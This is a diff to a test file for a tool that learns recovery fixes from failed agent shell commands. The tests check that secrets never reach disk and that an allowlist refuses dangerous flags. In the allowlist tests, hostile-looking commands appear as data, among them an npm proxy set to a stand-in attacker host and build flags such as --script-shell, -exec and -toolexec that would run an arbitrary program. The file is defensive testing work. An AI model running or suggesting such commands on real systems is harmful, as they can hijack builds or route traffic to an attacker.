@@ -1,5 +1,6 @@
 /** Failure-recovery pairs (src/recovery_pairs.ts, src/recovery_fix_policy.ts). Fixtures: the failed Bash payload is CAPTURE (tests/fixtures/claude_code_2_1_281/bash_failure.json, PROVENANCE.tsv); the successful Bash payload is FORMAT-DERIVED from https://code.claude.com/docs/en/hooks (PostToolUse: tool_name, tool_input.command, tool_response); the Copilot payload is FORMAT-DERIVED from tests/fixtures/harness_hook_payloads.ts (COPILOT_SCHEMA, PostToolUseFailureHookInput) as src/hook_adapters.ts canonicalizes it; command strings, error texts, credential shapes and expected fixes are HAND-DERIVED from the pairing rule and the allowlist. UNVERIFIED for Copilot CLI: no postToolUseFailure payload has been captured, the `Exit code 2` error wording in the Copilot test below is HAND-DERIVED (it is Claude Code's wording), and Copilot CLI's own session logs (events.jsonl under its session-state directory) record a shell command that exited 1 as `resultType: success` with the text `completed with exit code 1`, which suggests a non-zero shell exit reaches a hook as a success and never as postToolUseFailure. */
 import { execFileSync } from 'node:child_process'
+import { createHash } from 'node:crypto'
 import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, utimesSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { dirname, join, resolve } from 'node:path'
@@ -7,6 +8,7 @@ import { afterAll, describe, expect, it } from 'vitest'
 
 import { runBundle, tgIsolatedEnv } from './helpers/bundle.js'
 
+import { dataDir } from '../src/constants.js'
 import { sweepCacheRoots } from '../src/disk_cache.js'
 import type { HookEvent } from '../src/hook_registry.js'
 import { sessionStateKey } from '../src/hook_registry.js'
@@ -116,8 +118,8 @@ describe('learnableFix', () => {
   })
 
   it('learns the prefix when the success is the same command behind one', () => {
-    expect(learnableFix('pytest -q', 'source .venv/bin/activate && pytest -q', [])).toBe('source .venv/bin/activate && pytest -q')
-    expect(learnableFix('vitest run', 'npx vitest run', [])).toBe('npx vitest run')
+    expect(learnableFix('pytest -q', 'source .venv/bin/activate && pytest -q', [])).toBe('source .venv/bin/activate && (the same command)')
+    expect(learnableFix('vitest run', 'npx vitest run', [])).toBe('npx (the same command)')
   })
 
   it('learns nothing from a rerun with nothing in between', () => {
@@ -310,7 +312,7 @@ describe('the pending pair through the hooks', () => {
     const second = session()
     const raw = { ...CAPTURED_FAILURE, session_id: second, cwd }
     const line = contextOf(await postToolUseFailureWithExtras({ eventName: 'post_tool_use_failure', toolName: 'Bash', toolInput: { command: 'ls nonexistent_dir' }, sessionId: second, agentId: undefined, raw }))
-    expect(line).toContain('`cd src && ls nonexistent_dir`')
+    expect(line).toContain('`cd src && (the same command)`')
   })
 
   it('learns nothing when an edit landed in between', async () => {
@@ -532,7 +534,8 @@ describe('scoring', () => {
     expect(contextOf(await failed(s, cwd, 'pytest', first))).toContain(INSTALL)
     await succeeded(s, cwd, INSTALL)
     await failed(s, cwd, 'pytest', second)
-    const hurt = loadRecoveryPairs(cwd).map((p) => [p.signature.includes('foo') || p.signature.includes('No module'), p.hurt] as const)
+    const firstSignature = createHash('sha256').update('exit 1: ModuleNotFoundError: No module named foo').digest('hex')
+    const hurt = loadRecoveryPairs(cwd).map((p) => [p.signature === firstSignature, p.hurt] as const)
     expect(hurt.slice().sort()).toEqual([
       [false, 0],
       [true, 1],
@@ -611,11 +614,20 @@ describe('secrets never reach the disk', () => {
   })
 })
 
-/** Every file under `dir`, concatenated: what a grep -r of the directory would see. */
-function treeText(dir: string): string {
+/** Every file under `dir`, concatenated: what a grep -r of the directory would see. With `tolerant`, a file that vanishes or can not be read while the walk runs (a sibling test writing under the same home) is skipped. */
+function treeText(dir: string, tolerant = false): string {
   if (!existsSync(dir)) return ''
   return readdirSync(dir, { withFileTypes: true })
-    .map((entry) => (entry.isDirectory() ? treeText(join(dir, entry.name)) : readFileSync(join(dir, entry.name), 'utf8')))
+    .map((entry) => {
+      const path = join(dir, entry.name)
+      if (entry.isDirectory()) return treeText(path, tolerant)
+      try {
+        return readFileSync(path, 'utf8')
+      } catch (error) {
+        if (tolerant) return ''
+        throw error
+      }
+    })
     .join('\n')
 }
 
@@ -639,6 +651,10 @@ describe('no command line is written to disk', () => {
     const storeDir = dirname(recoveryStorePath(recoveryProjectKey(cwd) ?? ''))
     expect(treeText(sessionsDir)).not.toContain(secret)
     expect(treeText(storeDir)).not.toContain(secret)
+    for (const root of [process.env['TOKEN_GOAT_HOME'] ?? '', dataDir()]) {
+      expect(root).not.toBe('')
+      expect(treeText(root, true)).not.toContain(secret)
+    }
   }
 
   async function keepsOffDiskThroughout(make: (s: string) => string, i: number): Promise<void> {
@@ -682,6 +698,42 @@ describe('no command line is written to disk', () => {
     expect(pairs[0]?.commandShape).toMatch(/^[0-9a-f]{64}$/)
     expect(pairs[0]?.fix).toBe('npm ci')
     expect(storeText(cwd)).not.toContain(secret)
+  })
+
+  // HAND-DERIVED: the four forms a review probed. Each is a failed command with a free-text argument, rerun behind a prefix or wrapper that the allowlist does accept, so the argument reached the stored fix when the rerun was kept as text.
+  const RERUN_PROBES = [
+    ['a made-up flag behind an activation prefix', (s: string) => `pytest --zork=${s}`, (s: string) => `source .venv/bin/activate && pytest --zork=${s}`, 'source .venv/bin/activate && (the same command)'],
+    ['a -k expression behind npx', (s: string) => `pytest -k ${s}`, (s: string) => `npx pytest -k ${s}`, 'npx (the same command)'],
+    ['an environment assignment', () => 'pytest', (s: string) => `FOO="${s}" pytest`, null],
+    ['a header behind uv run', (s: string) => `pytest -H x-api:${s}`, (s: string) => `uv run pytest -H x-api:${s}`, 'uv run (the same command)'],
+  ] as const
+
+  it.each(RERUN_PROBES.map((probe, i) => [probe[0], probe[1], probe[2], probe[3], i] as const))('keeps the argument of %s off the disk when the pair is taught twice', async (_label, makeFailed, makeSuccess, expectedFix, i) => {
+    const secret = `hunter2-${process.pid}-r${i}`
+    const { cwd } = freshProject()
+    await teachTwice(cwd, makeFailed(secret), [], MODULE_ERROR, makeSuccess(secret))
+    const pairs = loadRecoveryPairs(cwd)
+    if (expectedFix === null) expect(pairs).toEqual([])
+    else expect(pairs.map((p) => p.fix)).toEqual([expectedFix])
+    const s = session()
+    const shown = contextOf(await failed(s, cwd, makeFailed(secret)))
+    expect(shown).not.toContain(secret)
+    if (expectedFix !== null) expect(shown).toContain(expectedFix)
+    noSecretOnDisk(secret, s, cwd)
+  })
+
+  // HAND-DERIVED: an argument parser echoes the offending token back unquoted, so errorPrefix (which masks quotes, paths and digits only) leaves the word in the error cluster; the cluster is therefore kept as a digest.
+  it.each(['error: unrecognized arguments: --zork=SECRET', 'Error: no such user SECRET', 'fatal: bad revision SECRET'])('keeps an unquoted echo in the error "%s" off the disk, yet still matches the same failure', async (line) => {
+    const secret = `hunter2-${process.pid}-e${line.length}`
+    const error = `Exit code 2\n${line.replace('SECRET', secret)}`
+    const { cwd } = freshProject()
+    await teachTwice(cwd, 'pytest', [INSTALL], error)
+    const pairs = loadRecoveryPairs(cwd)
+    expect(pairs.length).toBe(1)
+    expect(pairs[0]?.signature).toMatch(/^[0-9a-f]{64}$/)
+    const s = session()
+    expect(contextOf(await failed(s, cwd, 'pytest', error))).toContain(INSTALL)
+    noSecretOnDisk(secret, s, cwd)
   })
 
   it('writes the sentinel for a step the allowlist refuses, so the pair is not learned', async () => {
@@ -752,6 +804,30 @@ describe('the tightened allowlist', () => {
     'npm ci --proxy=http://evil.example',
   ])('refuses the source flag in %s', (command) => {
     expect(fixIsAllowed(command, 'zzz', wrappers)).toBe(false)
+  })
+
+  // HAND-DERIVED: flags that make an install or build run a program, read another config, or work in another directory. The first nine are the forms a review probed; the allowlist names the safe flags, so none of these can be admitted by shape.
+  it.each([
+    'npm ci --script-shell=/tmp/x',
+    'npm ci --userconfig=/tmp/x',
+    'npm ci --prefix=/tmp/x',
+    'go test -exec=x',
+    'go build -toolexec=x',
+    'cargo build --config=x',
+    'cargo build --manifest-path=/tmp/x',
+    'mvn clean install -s=x',
+    'yarn install --cwd=/tmp',
+    'npm ci --zork=hunter2',
+    'npm ci --loglevel=hunter2',
+    'cargo test --target-dir=/tmp/x',
+    'pip install -r requirements.txt --target=/tmp/x',
+    'uv sync --directory=/tmp/x',
+  ])('refuses the flag in %s', (command) => {
+    expect(fixIsAllowed(command, 'zzz', wrappers)).toBe(false)
+  })
+
+  it.each(['npm ci --ignore-scripts', 'npm ci --no-audit --no-fund', 'npm install --legacy-peer-deps', 'yarn install --frozen-lockfile', 'pnpm install --frozen-lockfile', 'cargo build --release --locked', 'cargo test --workspace --all-features', 'go test -race -count=1 ./...', 'go build -v ./cmd/tool', 'uv sync --frozen --no-dev', 'pip install -r requirements.txt --no-cache-dir -q', 'mvn -B -q clean install -DskipTests', 'make -j4 build', 'dotnet test --no-build --nologo'])('accepts the legitimate flags in %s', (command) => {
+    expect(fixIsAllowed(command, 'zzz', wrappers)).toBe(true)
   })
 
   it('re-checks a stored fix when it is about to be shown', async () => {
